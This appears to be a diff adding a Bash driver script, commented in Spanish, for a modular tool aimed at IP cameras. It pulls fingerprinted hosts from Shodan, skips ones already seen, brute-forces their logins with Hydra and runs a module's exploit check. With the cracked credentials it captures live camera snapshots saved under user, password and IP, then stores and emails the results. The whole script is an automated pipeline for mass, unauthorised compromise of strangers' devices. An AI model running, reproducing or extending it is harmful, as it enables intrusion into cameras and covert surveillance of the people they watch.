@@ -1,0 +1,318 @@
+#!/bin/bash
+
+function control_c {
+  echo -en "\n*** CONTROL-C *** Saliendo ***\n"
+  environment_clean
+  exit $?
+}
+
+function exit_with_error_msg {
+echolog $1 
+echolog "FINALIZADO CON ERRORES"
+environment_clean
+exit 1
+}
+
+function is_in_path {
+type $1 >/dev/null 2>&1 || { echolog2 "$1 no esta en el path"; return 1; }
+}
+
+
+function list_available_modules {
+available_modules=$( find "${BASEPATH}/modules" -mindepth 1 -maxdepth 1 -type d)
+echo "Modulos disponibles: " 
+echo "$available_modules" | while read eachmodule; do
+  echo "  $(basename "$eachmodule") "
+done
+# echo
+}
+
+function environment_clean {
+export PATH=$OLDPATH
+unset TERMINALMODE
+unset MODULENAME
+unset DEBUG
+unset LOGPREFIX
+cd $OLDPWD
+unset OLDPWD
+
+}
+
+##########
+## MAIN ##
+##########
+
+###############
+## init vars ##
+###############
+BASEPATH="$( cd -P "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
+BASEBINPATH="${BASEPATH}/bin"
+BASESNAPSHOTSPATH="${BASEPATH}/snapshots"
+BASEDICFOLDERPATH="${BASEPATH}/dic"
+MODULEFOLDERNAME=$1
+MODULEBASEPATH="${BASEPATH}/modules/${MODULEFOLDERNAME}"
+MODULEBINPATH="${MODULEBASEPATH}/bin"
+## MODULEDATAPATH="${MODULEBASEPATH}/data"
+## que tal si ponemos prefijo a todos los archios data de cada modulo 
+## y hacemos que compartan el directorio data?
+DATAPATH="${BASEPATH}/data"
+## ========================
+
+####################
+## env validation ##
+####################
+
+# no params given
+if [ -z "$1" ]; then
+  echo "ERROR: No se ha indicado ningun modulo a lanzar"
+  list_available_modules
+  exit 1
+fi
+
+# module folder exists
+if [ ! -d "${MODULEBASEPATH}" ]; then
+  echo "ERROR: El modulo indicado no se encuentra"
+  echo "Debe ser un directorio existente dentro de la carpeta principal del programa"
+  list_available_modules
+  exit 1
+fi
+
+
+
+##################
+## env settings ##
+##################
+OLDPWD=$(pwd)
+OLDPATH=${PATH}
+NEWPATH="${PATH}:${MODULEBINPATH}:${BASEBINPATH}"
+
+# prefijo para los logs con formato de fecha y hora del momento del escaneo
+# todos los archivos temporales relativos a la sesion de escaneo deberan tener en cuenta este prefijo
+# los ficheros de bases de datos generales obviamente no lo deben tener en consideracion
+LOGPREFIX="$(date '+%Y_%m_%d-%H_%M')"
+LOGPREFIX="${MODULEFOLDERNAME}.${LOGPREFIX}"
+# un ejemplo para entender LOGPREFIX:
+# si se ejecuta el modulo trendnet a las 16:40 del 3 de febrero de 2012, el logprefix seria:
+# trendnet.2012_02_03-16_40
+export LOGPREFIX="$LOGPREFIX"
+# prefiero dejarlo inaccesible y hardcoded a mostrarlo en la config.
+# no veo excesiva utilidad en poder alterar el valor de logprefix.
+# NOTA: LOGPREFIX debe estar seteado y exportado ANTES de cargar el NEWPATH
+# porque si no se corre peligro de llamar a echolog o echolog2 sin que se sepa donde hay que grabar el log.
+
+# calculamos ahora tambien el titulo de los posibles emails que enviamos a partir de esta ejecucion.
+# aun no sabemos si los necesitaremos, pero dado que el titulo está basado en la fecha y hora, 
+# calcular esto mas tarde causaria disonancias entre los ficheros de log creados y el titulo de los emails
+DATEANDTIMEFOREMAILREPORTS="$(date '+%Y-%m-%d %H:%M')"
+export DATEANDTIMEFOREMAILREPORTS="${DATEANDTIMEFOREMAILREPORTS}"
+# en el titulo del email tambien se añadira el nombre canónico del modulo (no el MODULEFOLDERNAME, sino el MODULENAME)
+# como aun no hemos cargado los datos del modulo, no lo sabemos, asi que dejamos esta variable com está y la exportamos
+# mas tarde, el script email-logs recogerá ambos datos, a los cuales ya tendrá acceso, y compondrá correctamente el título del email   
+
+export PATH="${NEWPATH}"
+## ^^^
+## se cargan los binarios customizados del modulo y los binarios generales del sistema
+## entre estos binarios se encuentran echolog y echolog2, pero aun necesitamos otra variable:
+## TERMINALMODE
+## para que funcionen correctamente, asi que vamos a ajustarla justo a continuacion
+
+
+##################################
+## general / module config load ##
+##################################
+source "${BASEPATH}/config"
+source "${MODULEBASEPATH}/config" 
+
+if [ ! -z ${FILECREATIONMASK} ]; then umask ${FILECREATIONMASK}; fi
+
+# some fallback settings in case module config is incomplete
+if [ -z "$HYDRA_URL" ]; then HYDRA_URL='/'; fi
+if [ -z "$DEFAULTLOGIN" ]; then DEFAULTLOGIN='admin'; fi
+if [ -z "$WORDLISTFILE" ]; then WORDLISTFILE="default.dic"; fi
+if [ -z "$MODULENAME" ]; then MODULENAME="Generic"; fi
+
+
+# algunas variables calculadas a partir de otras especificadas
+
+WORDLISTFILEPATH="${BASEDICFOLDERPATH}/${WORDLISTFILE}"
+if [ ! -f $WORDLISTFILE ]; then
+  echolog2 "diccionario especificado en config no se encuentra. pasando a default.dic"
+  WORDLISTFILE="default.dic"
+  export WORDLISTFILEPATH="${BASEDICFOLDERPATH}/${WORDLISTFILE}"  
+fi
+
+# necesitaremos algunas de estas variables por todo el entorno
+# asi que las exportamos
+export DATAPATH="${DATAPATH}"
+export MODULENAME="${MODULENAME}"
+export MODULEFOLDERNAME="${MODULEFOLDERNAME}"
+export DEBUG="${DEBUG}"
+export WORDLISTFILEPATH="${WORDLISTFILEPATH}"
+export HYDRA_URL="${HYDRA_URL}"
+export DEFAULTLOGIN="${DEFAULTLOGIN}"
+export BASESNAPSHOTSPATH="${BASESNAPSHOTSPATH}"
+export EMAILREPORTS="${EMAILREPORTS}"
+# y variables opcionales del modulo, si estan (podrian no estar presentes)
+if [ "$SNAPSHOT_URL" != "" ]; then export SNAPSHOT_URL="$SNAPSHOT_URL"; fi 
+
+
+################################
+## interactive mode detection ##
+################################
+
+# compatibilidad con ejecucion desde cron y similares en entornos no interactivos sin tty
+tty -s
+ttystatus=$?
+if [ "$ttystatus" == "0" ]; then 
+  export TERMINALMODE=1
+  ## ya podemos usar comandos como 
+  ## echolog para emitir logs normales y echolog2 para debugging 
+  echolog "INICIANDO - modo TERMINAL detectado"
+else 
+  export TERMINALMODE=0
+  ## ya podemos usar echolog 
+  ## pero al no estar ejecutandose en un terminal interactivo, 
+  ## los mensajes de depuracion de echolog2 se descartaran 
+  echolog "INICIANDO - modo DAEMON detectado"
+fi 
+
+#############################
+## debug control init vars ##
+#############################
+echolog2 "LOGPREFIX = ${LOGPREFIX}"
+echolog2 "BASEPATH=$( cd -P "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
+echolog2 "BASEBINPATH=${BASEBINPATH}"
+echolog2 "BASESNAPSHOTSPATH=${BASESNAPSHOTSPATH}"
+echolog2 "BASEDICFOLDERPATH=${BASEDICFOLDERPATH}"
+echolog2 "MODULEFOLDERNAME=$1"
+echolog2 "MODULEBASEPATH=${MODULEBASEPATH}"
+echolog2 "MODULEBINPATH=${MODULEBINPATH}"
+echolog2 "DATAPATH=${DATAPATH}"
+
+
+# check "data" folder inside modulebasepath
+# create if not there
+if [ ! -d "${DATAPATH}" ]; then
+  rm -rf "${DATAPATH}"
+  mkdir -p "${DATAPATH}"
+  echolog2 mkdir -p "${DATAPATH}"
+fi
+
+# check "snapshots" folder inside app base path
+# create if not there
+if [ ! -d "${BASESNAPSHOTSPATH}" ]; then
+  rm -rf "${BASESNAPSHOTSPATH}"
+  mkdir -p "${BASESNAPSHOTSPATH}"
+  echolog2 mkdir -p "${BASESNAPSHOTSPATH}"
+fi
+
+
+
+if [ -z "$INTERACTIVE" ]; then
+
+  ##############
+  ## GO GO GO ##
+  ##############
+  
+  if [ "$TERMINALMODE" == "1" ]; then trap control_c SIGINT; fi
+  echolog2 "cd ${DATAPATH}"
+  cd "${DATAPATH}"
+  echolog2 "pwd =" $(pwd)
+  echolog "[Shodan] Ejecutando consulta contra shodan..."
+  # obtener lista previa de shodan
+  shodanquery2file "${FINGERPRINT}" "${LOGPREFIX}.detected.list"
+  # comprobar si el resultado del query no esta vacio (en caso de api key incorrecta o ip que realiza la consulta no está en lista blanca)
+  checkfilesize "${LOGPREFIX}.detected.list" &> /dev/null || exit_with_error_msg "Shodan no devolvió datos. Comprueba la API KEY de shodan y la lista blanca de IPs que tienen acceso a la misma"
+  echolog2 "checkfilesize: ${LOGPREFIX}.detected.list comprobado OK"
+  # separar los hosts ya conocidos y hacer una lista solo con los nuevos detectados (newdetected) para no perder el tiempo con hosts ya trabajados
+  echolog "[RmDup] Descartando hosts detectados previamente..."
+  remove_old_entries "${LOGPREFIX}.detected.list"  all.detected.list "${LOGPREFIX}.newdetected.list"
+  # comprobar si quedan hosts nuevos despues de filtrar los hosts ya conocidos
+  checkfilesize "${LOGPREFIX}.newdetected.list" &> /dev/null || exit_with_error_msg "No se detectaron hosts nuevos. Todos ya estaban en histórico"
+  echolog2 "checkfilesize: ${LOGPREFIX}.newdetected.list comprobado OK"
+  
+  totalnewfoundcams=$(cat "${LOGPREFIX}.newdetected.list" | wc -l)
+  echolog "[Query] Total de camaras nuevas encontradas: $totalnewfoundcams"
+
+  ## ahora que ya tenemos el (horayfecha).newdetected.list con los hosts que nos interesan, 
+  ## podemos empezar a trabajar en serio...
+  
+  echolog "[Hydra] Iniciando crackeo de passwords"
+  hydra_check_list "${LOGPREFIX}.newdetected.list" "${LOGPREFIX}.cracked.list"
+  
+  checkfilesize "${LOGPREFIX}.cracked.list" &> /dev/null
+
+  checkfilesizestatus=$?
+  # aqui se usa el script checkfilesize de una forma difente a otras ejecuciones de mas arriba
+  # aqui vamos a usar un case para comprobar el exit status, que es 0 si el fichero existe y no esta vacio,
+  # y que es 1 si el fichero no existe o es de cero bytes.
+  # el script checkfilesize tambien se diseñó para comprobar el tamaño exacto en bytes de un archivo, cosa que se puede hacer
+  # asignando a una variable el valor de $(checkfilesize nombre-de-fichero), pero a lo largo del desarrollo
+  # esto ha resultado no ser de tanta utilidad como el exit code. 
+
+  case "$checkfilesizestatus" in
+  "1")
+    echolog "[Hydra] cracked.list vacío. Hydra no crackeó ningun pass. Se borra archivo."
+    ## por higiene, aseguramos que el fichero se borra, ya que no tiene nada
+    # rm -f ${LOGPREFIX}.cracked.list
+  ;;
+  *) 
+    echolog2 "checkfilesize: ${LOGPREFIX}.cracked.list comprobado OK"
+    totalcracked=$(cat "${LOGPREFIX}.cracked.list" | wc -l)
+    echolog "[Hydra] Total de hosts crackeados: $totalcracked"
+  ;;
+  esac
+
+  ## si el modulo contiene un binario llamado exploit_check_list, lo llamamos, 
+  ## pasándole como parámetro la la lista de nuevos hosts detectados, $LOGPREFIX.newdetected.list 
+  ## y como segundo parámetro el fichero de salida que queremos que escriba con los resultados, al que
+  ## llamaremos $LOGPREFIX.exploited.list y contrandra un host vulnerable por linea.
+  ## lógicamente, el script exploit_check_list que proporciona el módulo debe cumplir este estándar,
+  ## cosa que queda completamente en manos del desarrollador del módulo que se esté ejecutando. 
+  is_in_path exploit_check_list && exploit_check_list "${LOGPREFIX}.newdetected.list" "${LOGPREFIX}.exploited.list"
+
+  ## si el modulo proporciona la variable SNAPSHOT_URL, quiere decir que se trata de una camara IP
+  ## y que conocemos la ruta exacta hacia el archivo CGI que toma una foto de la misma en tiempo real.
+  ## por tanto, si dicha variable está presente, llamamos a take_snapshot_list, 
+  ## pasándole como parámetro la la lista de hosts cuyo password ha sido crackeado en la fase anterior con hydra 
+  ## ( $LOGPREFIX.cracked.list )
+  ## obviamente tenemos que pasarle la lista de hosts CRACKEADOS (no detectados) porque para tomar capturas 
+  ## de una camara IP se requiere estar correctamente autenticado con user y pass.
+  ## take_snapshot_list tomará capturas estaticas del sistema de capturas de cámaras IP,
+  ## y las guardará en la carpeta $BASESNAPSHOTSPATH bajo el nombre de "user_password_ip.jpg"
+
+  ## NOTA: en realidad take_snapshot_list es un frontend para take_snapshot, 
+  ## que se encarga de tomar la captura de un host determinado. 
+
+  ## el script take_snapshot_list ofrece apoyo para autenticacion HTTP (mediante wget). 
+  ## para cualquier otro tipo de AUTH en una cámara IP, habrá que buscarse la vida 
+  ## proporcionando un nuevo ejecutable take_snapshot_list en el directorio bin del módulo en cuestión,
+  ## para sobreescribir el comportamiento del take_snapshot_list estándar. 
+ 
+  if [ "$SNAPSHOT_URL" != "" ] ; then 
+    if [ -f "${LOGPREFIX}.cracked.list" ]; then
+      take_snapshot_list "${LOGPREFIX}.cracked.list"
+    else
+      echolog2 "${LOGPREFIX}.cracked.list no encontrado. no se toman capturas"
+    fi
+  fi
+  
+  update_database
+  
+  email_results
+  
+  echolog "FINALIZADO OK"
+
+  environment_clean
+
+  exit 0
+
+else
+  # spawn shell interactivo para ir a nuestro aire
+  bash
+  environment_clean
+  exit 0
+fi
+
+echo Ups... aqui no deberia llegar nunca...
+read foo
